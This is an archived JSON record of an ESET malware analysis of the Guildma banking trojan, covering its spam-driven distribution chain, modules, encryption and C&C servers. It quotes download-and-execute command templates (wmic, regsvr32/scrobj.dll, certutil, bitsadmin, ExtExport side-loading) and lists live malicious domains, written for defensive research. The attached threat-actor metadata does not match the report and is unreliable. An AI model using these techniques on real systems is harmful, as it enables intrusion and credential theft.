{
    "id": "b69a4542-ef62-4d48-bf97-6c07bdb5771e",
    "created_at": "2023-01-12T15:04:00.205568Z",
    "updated_at": "2025-03-27T02:09:01.428089Z",
    "deleted_at": null,
    "sha1_hash": "08115577656196213f719814ef0200115ba2cd66",
    "title": "2020-03-05 - Guildma- The Devil drives electric",
    "authors": "",
    "file_creation_date": "2022-05-28T18:08:11Z",
    "file_modification_date": "2022-05-28T18:08:11Z",
    "file_size": 662798,
    "plain_text": "# Guildma: The Devil drives electric\n\n**welivesecurity.com/2020/03/05/guildma-devil-drives-electric/**\n\nThe fourth installment of our occasional series demystifying Latin American banking trojans\n\n[ESET Research](https://www.welivesecurity.com/author/esetresearch/)\n5 Mar 2020 - 11:30AM\n\nThe fourth installment of our occasional series demystifying Latin American banking trojans\n\n\nMarch 5, 2020\n\n\nIn this blogpost, we will examine Guildma (also known as Astaroth, a powerful demon), a highly prevalent Latin\nAmerican banking trojan. This Brazil-targeting trojan, written in Delphi, boasts some innovative execution and attack\ntechniques. We will describe the most recent version, highlighting the most notable changes made since the middle\nof 2019 when an avalanche of articles about Guildma was published in response to its largest campaign to date.\n\n## Characteristics\n\n\n-----\n\nGuildma is a Latin American banking trojan that targets Brazil exclusively. Based on our telemetry — as well as the\npublic attention it has received — we believe it to be the most impactful and advanced banking trojan in the region.\nBesides targeting financial institutions, Guildma also attempts to steal credentials for email accounts, e‑shops and\nstreaming services, and affects at least ten times as many victims as other Latin American banking trojans already\ndescribed in this series. It uses innovative methods of execution and sophisticated attack techniques.\n\nUnlike the Latin American banking trojans we have described previously, Guildma does not store the fake pop-up\nwindows it uses within the binary. Instead, the attack is orchestrated by its C&C server. This gives the authors greater\nflexibility to react to countermeasures implemented by the targeted banks.\n\nGuildma implements the following backdoor functionalities:\n\nTaking screenshots\nCapturing keystrokes\nEmulating keyboard and mouse\nBlocking shortcuts (such as disabling Alt + F4 to make it harder to get rid of fake windows it may display)\nDownloading and executing files\nRestarting the machine\n\nGuildma is very modular. At the time of writing, it consists of 10 modules, not including distribution chain stages. The\nfunctionality of individual modules will be discussed later.\n\n## Evolution of distribution chains\n\nOur telemetry indicates Guildma spreads exclusively through spam emails with malicious attachments. Here are a\nfew examples from a campaign from the middle of November 2019.\n\n_Figure 1. Spam email example (translation: “Hello, please explain these photos to me. I’m waiting for your explanation!”)_\n\n_[Figure 2. Spam email example (translation: “Dear member of consórcio, attached is the proof of bid no. 75432.”)](https://thebrazilbusiness.com/article/consorcio-in-brazil)_\n\n\n-----\n\n_Figure 3. Spam email example (translation: “Good morning, I am sending the proof of transfer – DOC. Citibank”)_\n\n\n-----\n\n_Figure 4. Spam email example. Fake invoice reminder stating that a payment is due the day after tomorrow and that the payment_\n\n_may take up to 72 hours to be processed._\n\nOne of the defining characteristics of Guildma’s distribution chains is using tools already present on the system, often\n_in new and unusual ways._\n\nAnother characteristic is reusing techniques. New techniques are added every once in a while, but for the most part,\nthe developers seem to simply reuse techniques from older versions.\n\n\n-----\n\n_Figure 5. Distribution chain of Guildma in version 150_\n\nFigure 5 shows the distribution chain for version 150, but the structure of Guildma’s distribution chains is very\ndynamic. For instance, in previous versions, the malicious LNK file shown in Figure 5 was not embedded in a ZIP\narchive, or an SFX RAR archive containing an MSI installer was used instead. Also, there used to be another JScript\nstage whose sole purpose was downloading and executing the final JScript stage; there have been too many\nchanges overall to fit into this article. In fact, the only part that has mostly stayed the same is the final JScript stage.\n\nUsing data from our long-term, in-depth tracking of this family, we have compiled a very good picture of Guildma’s\nactivity.\n\nFigure 6 shows all ESET detections of Guildma’s first-stage component. As you can see, the campaigns were\nramping up slowly until a massive campaign in August 2019, when we were seeing up to 50,000 samples per day.\nThis campaign went on for almost two months and accounted for more than double the amount of detections we had\nseen in the 10 months prior.\n\n_Figure 6. First stage Guildma detections since October 2018_\n\nFollowing is a summary of some of the more interesting techniques used in the last 14 months.\n\n### Execution of the JScript stage\n\nOver the last year, Guildma has used several methods of executing the JScript stages of its distribution chain. At the\n[end of 2018, Guildma was hiding its code in eXtensible Stylesheet Language (.xsl) files and using wmic.exe to](https://attack.mitre.org/techniques/T1220/)\ndownload and execute them:\n\nwmic.exe <wmic query> /format:”<URL>”\n\nIt then briefly moved on to using regsvr32.exe and scrobj.dll to download a JScript-implemented COM object and\nexecute its registration routine (which contained the malicious code):\n\nregsvr32.exe /s /n /u /i:<URL> scrobj.dll\n\n\n-----\n\nMost recently, the authors started abusing Windows Explorer to execute the JScript stage. This attack relies on the\nfact that Windows Explorer will try to open any file passed to it on the command line with its associated program and\nthe fact that the default association for .js files is the Microsoft Windows Script Host. The “script” passed to Windows\nExplorer is a single command whose purpose is to download and execute the actual JScript stage:\n\necho GetObject(‘script:<URL>’) > <file>.js | explorer.exe <random switches> <file>.js\n\n### Execution of the binary modules\n\nMethods of running the PE modules are no less diverse.\n\nWhen we started tracking Guildma, it was abusing Avast’s aswRunDll.exe to launch the first binary stage, with\nregsvr32.exe as a failover for computers where Avast’s products weren’t installed. The use of aswRunDll.exe was\nthen dropped, leaving regsvr32.exe as the sole method of execution. After a brief period of using rundll32.exe,\nGuildma switched to its current execution method — ExtExport.exe.\n\nExtExport.exe is an undocumented component of Microsoft Internet Explorer used for exporting bookmarks from\nMozilla Firefox and 360 Secure Browser, and can be abused for DLL Side-Loading. When the following command is\nexecuted, mozcrt19.dll, mozsqlite3.dll, and sqlite3.dll are loaded from the folder specified on the command line:\n\nC:\\Program Files\\Internet Explorer\\ExtExport.exe <folder> <dummy 1> <dummy 2>\n\nTo abuse this, you would normally drop the DLL to be loaded as one of the above-mentioned files; Guildma uses all\n_three._\n\n### Downloading the binary modules\n\nGuildma has also utilized a couple of different ways to download the binary modules. The first version was using\ncertutil.exe copied to certis.exe (presumably to evade detection):\n\ncertis.exe -urlcache -split -f “<URL>” “<destination path>”\n\nThe authors then switched to BITSAdmin — the Microsoft Background Intelligent Transfer Service management tool\n— and are still using it at the time of writing:\n\nbitsadmin.exe /transfer <random number> /priority foreground <URL> <destination>\n\nFor a couple months, the binary modules were base64-encoded and hosted on Google Cloud. In that time, Guildma\nwas using both BITSAdmin and certutil — BITSAdmin to download the modules and certutil to decode them.\n\n### Other changes\n\nGuildma uses strange, non-descriptive variable and function names. When we started tracking Guildma, the names,\nwhile nonsensical, were clearly man-made (e.g. “radador” for the random number function or “Bxaki” for the download\nfunction). In June 2019 they were all changed to random-looking names (e.g. “bx021” and “mrc430”). At first, we\nthought the authors implemented some kind of an automated script obfuscator, but it turned out to be a onetime\nchange and the names have remained the same since.\n\n[A relatively new addition is the age-old technique of using ADS (Alternate Data Streams) to store the binary modules.](https://attack.mitre.org/techniques/T1096/)\nAll the modules are now stored as ADS of a single file (e.g. “desktop.ini:nauwuygiaa.jpg”,\n_“desktop.ini:nauwuygiab.jpg”, etc.)._\n\n## Version history\n\nGuildma has seemingly gone through many versions during its development, but there was usually very little\ndevelopment between versions — due to its clunky architecture utilizing hardcoded configuration values, for the most\npart the authors have to recompile all the binaries for every new campaign. A job that is clearly not completely\n\n\n-----\n\nautomated, since there has often been a significant delay between updating the version number in the scripts and in\nthe binaries.\n\nIn this article, we cover version 150, but since we started writing, two more versions have been released. They\ncontain no substantial change in functionality or distribution, supporting our claims about Guildma’s development\ncycle.\n\nThe final stage of the distribution chain used to contain a version name (and even before that, it used to download\nsaid name along with the binary modules), but it has been (presumably) permanently replaced with a simple “xXx”\nsince version 148.\n\nTable 1 summarizes all the versions released since we started tracking Guildma actively in October 2018. Looking at\nthe version strings, we get the feeling the author is passionate about ecology and fast cars.\n\n_Table 1. Guildma version history_\n\n**First seen** **Version number** **Version name** **Version prefix**\n\n2018-09-18 131 131_SUPER_Tesla marxvxinhhm\n\n2018-10-31 132 132_ULTRA_Tesla srsysddirrx\n\n2018-11-28 133 133_TORRE_DE_Tesla mxgetronicosxy\n\n2018-11-29 134 134_MAXX_TESLAs dwqiopawsamazon\n\n2018-12-03 135 135_MOAB_TESLAs lu769tsla\n\n2018-12-13 136 136_KRAKEN_TESLAs lrdsnhrxxfery\n\n2019-02-06 137 137_RAPTOR_TESLAs rakpat0rpcack\n\n2019-03-21 138 138_RAPTOR_TESLAs_ hillwd763free\n\n2019-05-20 139 139_TESLA_ falxconxrenw\n\n2019-06-03 140 140_ASTH_ valehraysystqx\n\n2019-06-24 141 141_T3SL4S_ ayt3ese4xw\n\n2019-07-17 142 142_T3SL4S_ halawxtz\n\n2019-08-09 143 143_T3SL4S_ asmonnwqk\n\n2019-08-26 144 144_MULT1T3SL4S_ daffsyshqy\n\n2019-09-26 145 145_MULT1T3SL4S_ landoqeahjky\n\n2019-10-16 146 146_MULT1T3SL4S_ valkanxpca\n\n2019-11-04 147 147_MULT1T3SL4S_ koddsuffy\n\n2019-11-19 148 xXx lpquayevvt\n\n2019-11-22 149 nauwuygia\n\n2019-12-13 150 andrealfo\n\n2020-01-14 151 balberith\n\n2020-02-05 152 masihaddajjal\n\n## Module overview\n\n\n-----\n\nAs mentioned earlier, Guildma is very modular; the structure of its modules seems to be mostly constant. In this\nsection, we will briefly describe the functionality of each module.\n\nAll module names are composed of a shared, version-dependent prefix and a module-specific suffix. In Table 2, the\nversion-dependent prefix is andrealfo.\n\n_Table 2. Guildma module overview_\n\n**URL filename** **Filesystem filename** **Module**\n\nandrealfohh1a.dll.zip andrealfo64.~ Main module loader 1 (part 1)\n\nandrealfohh1b.dll.zip Main module loader 1 (part 2)\n\nandrealfoxa.gif.zip andrealfoxa.gif Main module injector (part 1)\n\nandrealfoxb.gif.zip andrealfoxb.gif Main module injector (part 2)\n\nandrealfoxc.gif.zip andrealfoxc.gif Main module injector (part 3)\n\nandrealfogx.gif.zip andrealfogx.gif Main module loader 2\n\nandrealfog.gif.zip andrealfog.gif Main module\n\nandrealfoc.jpg.zip andrealfoc.jpg Contacts stealer and form grabber module\n\nandrealfodwwn.gif.zip andrealfodwwn.gif RAT module (DLL)\n\nandrealfodx.gif.zip andrealfodx.gif RAT module (EXE)\n\nandrealfoa.jpg.zip andrealfoa.jpg MailPassView\n\nandrealfob.jpg.zip andrealfob.jpg WebBrowserPassView\n\nandrealfoi.gif.zip andrealfoi.gif JScript dropper module\n\nWith the exception of the main module loader 1 (*64.~) and the main module injector (*xa.gif, *xb.gif and *xc.gif), all\nthe modules are encrypted with a simple XOR cipher using a repeating 32-byte key. The key is generated from a 32bit seed using the algorithm shown in Figure 7. The seed value is obfuscated in the binaries to prevent simple\nextraction (see Figure 8).\n\n\n1\n\n2\n\n3\n\n4\n\n\nkey = bytearray ();\n\nfor i in range ( 32 ):\n\nkey . append ( seed & 0xff );\n\nseed >>= 1;\n\n\n_Figure 7. Key generation algorithm_\n\n\n-----\n\n_Figure 8. Seed obfuscation in the binary_\n\nThree modules communicate with a C&C server: Main module, RAT module, and Contacts stealer and form grabber.\nThe communication is done over HTTP(S) using a combination of base64 and various simple custom encryption\nalgorithms to protect the data being transferred.\n\nIn the next section, we describe how the C&C server address is obtained.\n\n### Main module loader 1 (*64.~)\n\nThis is the first binary stage of the chain. The file is a DLL downloaded in two parts, which are concatenated by the\nprevious JScript stage. It loads the three files comprising the next stage loader (*xa.gif, *xb.gif and *xc.gif),\nconcatenates them, maps the resulting PE file into its own address space and executes it.\n\n[Loading a PE file is a relatively complex process, so the authors used the BTMemoryModule open-source library for](https://github.com/DSPlayer/memorymodule/blob/master/BTMemoryModule/BTMemoryModule.pas)\nthis purpose.\n\n### Main module injector (*xa.gif + *xb.gif + *xc.gif)\n\nThis module loads the next stage (*gx.gif) from disk and decrypts it. It then runs the first existing executable from the\nfollowing list and injects the decrypted payload into it.\n\nC:\\Program Files\\AVAST Software\\Avast\\aswRunDll.exe\nC:\\Program Files\\Diebold\\Warsaw\\unins000.exe *\nC:\\Windows\\SysWOW64\\userinit.exe\nC:\\Windows\\System32\\userinit.exe\n\n\n\n- An application, popular in Brazil, to protect access to online banking.\n\n### Main module loader 2 (*gx.gif)\n\nThe last loader stage is very simple and seems to needlessly duplicate the functionality of main module loader 1. It\nloads and decrypts the main module (*g.gif), maps it into its own memory space and executes it.\n\n### Main module (*g.gif)\n\nGuildma’s main module orchestrates all the remaining modules. Its implementation is deceptively complex, using\ncountless timers and events, but its functionality is actually relatively simple. It contains legacy code that is not being\nused anymore as well as pre-production code that is not being used yet.\n\nOn loading, this module checks if it is running in a sandboxed environment (for example, by examining the computer\nname and system disk volume ID), if there are other running instances of itself (based on window names) and if the\nsystem locale is different from Portuguese. If any check reveals the system is uninteresting or already compromised\nby Guildma, the malware terminates.\n\n\n-----\n\nOtherwise, the module then collects information from the system (computer name, which security software is being\nused, installed programs…) and establishes contact with the C&C server. It then starts monitoring interesting events,\nmainly when certain applications are launched or online banking sites opened, and executing appropriate actions\n(e.g. taking screenshots, preventing the user from closing the window by intercepting keyboard shortcuts, launching\nthe RAT module, and so on).\n\nThe module also implements backdoor commands whose functionality largely overlaps with the RAT module.\n\n### Contact stealer and form grabber (*c.jpg)\n\nThis module has two functions — gathering email addresses and form data from webpages.\n\nEmail addresses are obtained from desktop email clients (such as Microsoft Outlook, Thunderbird and The Bat!) by\nparsing their address books as well as the emails themselves.\n\nThe form grabber uses Windows COM technology to interact with Internet Explorer. It waits until a targeted site is\nopened (mostly Brazilian webmails, e-shops and payment gateways) and then logs the user out, forcing the victim to\ninput credentials. It then retrieves the DOM and looks for important input field values (such as usernames, passwords\nand credit card numbers).\n\n### RAT module (*dwwn.gif, *dx.gif)\n\nThe RAT module comes in two functionally identical compilations — DLL (*dwwn.gif) and EXE (*.dx.gif).\n\nIt implements download and execute functionality, can take screenshots, emulate keyboard and mouse input, and\nrestart the computer.\n\nMost Latin American banking trojans display fake pop-up windows based on monitoring the active window’s name.\nThese windows are usually stored in the binary. We have not found such code in Guildma, but the RAT module\ncontains a Delphi form implementing a simple web browser. Since it is also executed based on the active window’s\nname, we believe this form is used for displaying fake dialogs to the user.\n\n### MailPassView (*a.jpg) and BrowserPassView (*b.jpg)\n\nThese are freeware tools from Nirsoft for extracting saved credentials from popular email clients and web browsers\nrespectively. Since Nirsoft has removed support for quiet operation (output to file, with no GUI) from newer versions\nto curb the abuse of these tools by malware, Guildma’s authors are using older versions that had those features. The\n[same tools are also leveraged by Mispadu, except Mispadu is using newer versions with quiet operation support](https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/)\npatched back in.\n\n### JScript dropper module (*i.gif)\n\nThis module drops and executes (using cscript.exe) a JScript file. The script consists of two parts — the first part is\nstored as one long encrypted string, while the second part is assembled from many short strings (some encrypted\nand some in plaintext). Worthy of note is the fact that strings in the dropped JScript file are encrypted by this dropper\nmodule with a randomly generated key, so they are present in the clear in the dropper.\n\nThe script executes the following actions:\n\nDisables UAC\nDisables EXE signature checking\nDisables Windows Defender\nCreates a firewall rule disabling network access for\n\nC:\\Program Files\\AVAST Software\\Avast\\Setup\\avast.setup\nDisables wsddntf driver (Diebold Warsaw GAS Tecnologia — the banking access protection software\nintroduced earlier)\n\n\n-----\n\nAdds a firewall exception for files used as injection targets\n\nC:\\Program Files\\Diebold\\Warsaw\\unins000.exe\nC:\\Program Files\\AVAST Software\\Avast\\aswRunDll.exe\n\nWe believe this module may still be in development as we have never observed it on our test machines dropping the\nscript.\n\n## New developments (since mid-2019)\n\n### New C&C retrieval\n\nIn version 142, a new way of distributing C&C servers, abusing YouTube and Facebook profiles, was implemented.\nHowever, the authors stopped using Facebook almost immediately and, at the time of writing, are fully relying on\n[YouTube. This is similar to Casbaneiro, but a bit cruder. While Casbaneiro was hiding the data in video descriptions](https://www.welivesecurity.com/2019/10/03/casbaneiro-trojan-dangerous-cooking/)\nand obfuscating it as a part of a URL, Guildma simply places the data in the channel description. The start and end of\nthe encrypted C&C addresses is delimited by “|||”. The data in between is base64 encoded and encrypted using\n[Mispadu’s string encryption algorithm. This is now the primary method of retrieving C&C servers; the old method](https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/)\n[(described by Avast) is still present as a backup.](https://decoded.avast.io/threatintel/deep-dive-into-guildma-malware/)\n\n_Figure 9. Encrypted Guildma C&C server domains stored on YouTube_\n\n### Modules added and removed\n\nThe previously described JScript dropper module was added in version 145. Conversely, in version 139, Guildma\ndropped two other modules present in older versions — mass mailer (*f.jpg) and its loader (*e.jpg). In the next few\nversions, these modules were still accessible under the expected names (<version prefix>e.jpg and <version\nprefix>f.jpg) from the same server as the other modules. This leads us to believe these modules are still being\ndeveloped, but are now only distributed as needed, presumably using the download and execute backdoor\ncommand.\n\n### New string encryption\n\nThe JScript dropper module brought with it a new string encryption algorithm. A variant of this algorithm (shown in\nFigure 10) was propagated into other modules in version 147.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n\ndef decrypt ( ct, key ):\n\n# stage 1\n\nct = unhexlify ( ct );\n\nlast = ct [ 0 ];\n\ns = bytearray ( ct [ 1 : ] );\n\nfor i in range ( len ( s ) ):\n\nx = s [ i ] ^ key [ i % len ( key ) ];\n\nif last > x:\n\nx += 0xff;\n\nx -= last;\n\nlast = s [ i ];\n\ns [ i ] = x;\n\n# stage 2 - reverse string\n\ns = s [::-1];\n\n# stage 3 - c = not ( c - 10 )\n\ns = \"\" . join ( [ chr ( ( ~( c - 10 ) ) & 0xff ) for c in s ] );\n\n# stage 4 - Base25 decode and key subtraction\n\nk = ord ( s [ 0 ] ) - 65;\n\not = \"\";\n\nfor i in range ( 1, len ( s ), 2 ):\n\not += chr ( ( ord ( s [ i ] ) - 65 ) * 25 + ord ( s [ i + 1 ] ) - 65 - k - 100 );\n\nreturn ot;\n\n\n_Figure 10. New string encryption algorithm_\n\n[Originally, Guildma was using the same string encryption as Casbaneiro. The new algorithm has four stages and as](https://www.welivesecurity.com/2019/10/03/casbaneiro-trojan-dangerous-cooking/)\nyou can see, the original string encryption algorithm is still used as the first stage. Also of note is the fact that the\n[fourth stage is once again using Mispadu’s encryption algorithm.](https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/)\n\nIn version 148 Guildma implemented a string table; all strings are decrypted at the beginning of execution and\naccessed from the table when needed.\n\n### Removal of international targets\n\n\n-----\n\nIn version 138, Guildma added capability to target institutions (mainly banks) outside of Brazil. Despite that, we have\nobserved no international campaigns; the campaigns hosting files on Cloudflare Workers’ infrastructure even went as\nfar as to block any downloads from non-Brazilian IPs. In fact, in the last 14 months we haven’t seen any campaign\ntargeting users outside of Brazil.\n\nFinally, in version 145, the capability to target institutions outside of Brazil was removed. Based on these facts, we\nbelieve it was merely an in-development feature which ended up being scrapped.\n\n## Conclusion\n\nIn this part of the series, we have talked about Guildma, the most prevalent Latin American banking trojan we have\nseen. We have shown its rich historical developments while focusing on the most recent variant.\n\nGuildma once again shares the prevailing characteristics of a Latin American banking trojan. It is written in Delphi,\ntargets the region, implements backdoor functionality, splits its functionality into many modules and abuses legitimate\ntools.\n\nGuildma also shares interesting common features with families described earlier in this series. Namely, its current\nencryption algorithm combines the ones used by Casbaneiro and Mispadu.\n\n_For any inquiries, contact us at threatintel@eset.com. Indicators of Compromise can also be found in our GitHub_\n_repository._\n\n## Indicators of Compromise (IoCs)\n\n### Hashes\n\n**SHA-1** **Description** **ESET Detection name**\n\n45c58bc40768dce6a6c611e08fd34c62441aa776 Main module loader 1 Win32/Spy.Guildma.BM\n\n861f20b0dcc55f94b4c43e4a7e77f042c21506cf Main module injector Win32/Spy.Guildma.BJ\n\n37fd19b1ab1dcc25e07bc96d4c02d81cf4edb8a1 Main module loader 2 Win32/Spy.Guildma.Q\n\na7b10b8de2b0ef898cff31fa2d9d5cbaae2e9d0d Main module Win32/Spy.Guildma.BS\n\n\n4f65736a9d6b94b376c58b3cdcb49bbd295cd8cc Contacts stealer and\nform grabber\n\n\nWin32/Spy.Guildma.D\n\n\n6c9304c5862d4e0de1c86d7ae3764f5e8358daff RAT module (DLL) Win32/Spy.Guildma.BR\n\n89fbffe456de850f7abf4f97d3b9da4bad6afb57 RAT module (EXE) Win32/Spy.Guildma.BR\n\naf0d495ecc3622b14a40ddcd8005873c5ddc3a2d MailPassView Win32/PSWTool.MailPassView.E\n\n92bcf54079cbba04f584eac4486473c3abdd88cd WebBrowserPassView Win32/PSWTool.WebBrowserPassView.E\n\n\na2048f435f076988bf094274192a196216d75a5f JScript dropper\nmodule\n\n### Filenames\n\nC:\\Users\\Public\\Libraries\\qlanl\\*\n\n### Startup link\n\nLocation\n\n\nWin32/Spy.Guildma.BP\n\n\n%APPDATA%\\Microsoft\\Programs\\StartUp\\reiast%USERNAME%%COMPUTERNAME% lnk\n\n\n-----\n\nTargets\n\nC:\\Program Files (x86)\\Internet Explorer\\ExtExport.exe\nC:\\Program Files\\Internet Explorer\\ExtExport.exe\n\nArgs\n\n<install dir> <rand> <rand>\n(where <rand> is a random, 5 to 9 character long string generated from the alphabet\nqwertyuiop1lgfdsas2dfghj3zcvbnmm)\n\n### C&C servers\n\nhttps://www.zvatrswtsrw[.]ml\nhttps://xskcjzamlkxwo[.]gq\nhttps://www.vhguyeu[.]ml\nhttps://www.carnataldez[.]ml\nhttps://www.movbmog[.]ga\nhttps://iuiuytrytrewrqw[.]gq\nhttps://www.gucinowertr[.]tk\nhttps://equilibrios[.]ga\nhttps://www.clooinfor[.]cf\nhttps://ambirsr[.]tk\nhttps://dbuhcbudyu[.]tk\nhttps://nvfjvtntt[.]cf\nhttp://whia7g.acquafufheirybveru[.]online\n\n## MITRE ATT&CK techniques\n\n**Tactic** **ID** **Name** **Description**\n\n\nInitial\nAccess\n\n\n[T1193](https://attack.mitre.org/techniques/T1193/) Spearphishing Attachment Guildma distribution\nchains start with a\nmalicious email\nattachment.\n\n\nExecution [T1073](https://attack.mitre.org/techniques/T1073/) Rundll32 Guildma utilizes\nrundll32.exe to execute its\nbinary modules.\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/) Windows\nManagement\nInstrumentation\n\n\nGuildma abuses WMIC.exe to execute some\nof its distribution chain stages.\n\n\nPersistence [T1060](https://attack.mitre.org/techniques/T1060/) Registry Run Keys / Startup Folder Guildma ensures\npersistence by creating a\nLNK file in the\n%STARTUP% folder.\n\n\nDefense\nEvasion\n\n\n[T1197](https://attack.mitre.org/techniques/T1197/) BITS Jobs BITSAdmin.exe is used to\ndownload binary modules.\n\n\n[T1089](https://attack.mitre.org/techniques/T1089/) Disabling Security\nTools\n\n[T1140](https://attack.mitre.org/techniques/T1140/) Deobfuscate/Decode\nFiles or Information\n\n\nGuildma disables Windows Defender.\n\nThe majority of Guildma modules need to be\ndecrypted after downloading.\n\n\n[T1073](https://attack.mitre.org/techniques/T1073/) DLL Side-Loading Guildma abuses ExtExport.exe for DLL SideLoading.\n\n\n-----\n\n**Tactic** **ID** **Name** **Description**\n\n[T1096](https://attack.mitre.org/techniques/T1096/) NTFS File Attributes Guildma utilizes ADS to hide its modules on\ndisk.\n\n[T1055](https://attack.mitre.org/techniques/T1055/) Process Injection Guildma utilizes process injection when\nexecuting its modules.\n\n[T1064](https://attack.mitre.org/techniques/T1064/) Scripting Guildma implements its distribution chain\nstages in various scripting languages (mainly\nJScript).\n\n\n[T1220](https://attack.mitre.org/techniques/T1220/) XSL Script\nProcessing\n\n\nGuildma utilizes XSL script(s) in its distribution\nchains.\n\n\nCredential\nAccess\n\n\n[T1081](https://attack.mitre.org/techniques/T1081/) Credentials in Files Guildma extracts\ncredentials stored by web\nbrowsers and email clients\nin files.\n\n\n[T1214](https://attack.mitre.org/techniques/T1214/) Credentials in\nRegistry\n\n\nGuildma extracts credentials stored by web\nbrowsers and email clients in Windows\nRegistry.\n\n\nDiscovery [T1083](https://attack.mitre.org/techniques/T1083/) File and Directory Discovery Guildma uses presence of\ncertain files to determine\nwhether banking and\nsecurity tools are installed.\n\n\n[T1010](https://attack.mitre.org/techniques/T1010/) Application Window\nDiscovery\n\n[T1063](https://attack.mitre.org/techniques/T1063/) Security Software\nDiscovery\n\n[T1082](https://attack.mitre.org/techniques/T1082/) System Information\nDiscovery\n\n[T1497](https://attack.mitre.org/techniques/T1497/) Virtualization/Sandbox\nEvasion\n\n\nGuildma uses window discovery to find and\nterminate older versions of itself and to detect\nwhen interesting programs (e.g. banking\napplications or web browsers) are running.\n\nGuildma detects the presence of several\nsecurity products.\n\nGuildma collects OS version and bitness,\ncomputer name and system locale.\n\nGuildma uses directory names, computer\nnames, volume IDs, and existence of named\nobjects to detect sandboxes and virtualized\nenvironments.\n\n\nCollection [T1113](https://attack.mitre.org/techniques/T1113/) Screen Capture Guildma is capable of\ntaking screenshots.\n\n\nCommand\nand Control\n\n\n[T1024](https://attack.mitre.org/techniques/T1024/) Custom Cryptographic Protocol New C&C addresses are\nencrypted using custom\nencryption algorithms.\n\n\nExfiltration [T1041](https://attack.mitre.org/techniques/T1041/) Exfiltration Over Command and Control\nChannel\n\n5 Mar 2020 - 11:30AM\n\n\nGuildma uploads\nscreenshots and log files\nto the C&C server.\n\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n\n-----\n\n### Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-05 - Guildma- The Devil drives electric.pdf"
    ],
    "report_names": [
        "2020-03-05 - Guildma- The Devil drives electric.pdf"
    ],
    "threat_actors": [
        {
            "id": "7ba9e3e3-1cef-4e20-be7e-95f05e8295d7",
            "created_at": "2022-10-25T16:07:23.821494Z",
            "updated_at": "2025-03-27T02:02:09.993311Z",
            "deleted_at": null,
            "main_name": "Mabna Institute",
            "aliases": [
                "Cobalt Dickens",
                "Mabna Institute",
                "Silent Librarian",
                "TA407",
                "TA4900",
                "Yellow Nabu"
            ],
            "source_name": "ETDA:Mabna Institute",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bc289ba8-bc61-474c-8462-a3f7179d97bb",
            "created_at": "2022-10-25T16:07:24.450609Z",
            "updated_at": "2025-03-27T02:02:10.235933Z",
            "deleted_at": null,
            "main_name": "Avalanche",
            "aliases": [],
            "source_name": "ETDA:Avalanche",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "adc8bb1a-6ded-4b27-8163-8069d5a6d492",
            "created_at": "2022-10-25T15:50:23.566869Z",
            "updated_at": "2025-03-27T02:00:55.500642Z",
            "deleted_at": null,
            "main_name": "Silent Librarian",
            "aliases": [
                "Silent Librarian",
                "TA407",
                "COBALT DICKENS"
            ],
            "source_name": "MITRE:Silent Librarian",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "42e41377-c64c-4be9-87a0-ee903e4b9055",
            "created_at": "2023-01-06T13:46:38.950322Z",
            "updated_at": "2025-03-27T02:00:02.960397Z",
            "deleted_at": null,
            "main_name": "Silent Librarian",
            "aliases": [
                "TA4900",
                "Yellow Nabu",
                "COBALT DICKENS",
                "Mabna Institute",
                "TA407"
            ],
            "source_name": "MISPGALAXY:Silent Librarian",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535840,
    "ts_updated_at": 1743041341,
    "ts_creation_date": 1653761291,
    "ts_modification_date": 1653761291,
    "files": {
        "pdf": "https://archive.orkl.eu/08115577656196213f719814ef0200115ba2cd66.pdf",
        "text": "https://archive.orkl.eu/08115577656196213f719814ef0200115ba2cd66.txt",
        "img": "https://archive.orkl.eu/08115577656196213f719814ef0200115ba2cd66.jpg"
    }
}